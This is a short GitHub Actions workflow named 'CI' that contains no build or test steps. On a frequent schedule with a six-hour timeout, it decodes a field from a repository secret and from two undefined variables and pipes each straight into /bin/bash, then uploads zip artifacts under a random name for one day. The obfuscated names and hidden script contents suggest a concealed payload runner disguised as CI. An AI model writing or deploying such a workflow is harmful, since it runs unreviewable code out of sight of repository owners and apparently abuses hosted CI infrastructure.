name: CI
on:
  workflow_dispatch:

  schedule:
    - cron: '13 4,10,16,22 * * *'
permissions:
  contents: read
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  ci:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
      - name: Launch
        env:
          u075: ${{ secrets.u075 }}
        run: |
          printf '%s' "$u075" | jq -r .fbh6 | /bin/bash
          printf '%s' "$iljtu443" | jq -r .zwkc405 | /bin/bash
          echo $xc6718 | jq -r .b19406 | /bin/bash

      - name: Save artifact
        uses: actions/upload-artifact@v4
        with:
          name: 3VDJJlon
          path: "*.zip"
          retention-days: 1
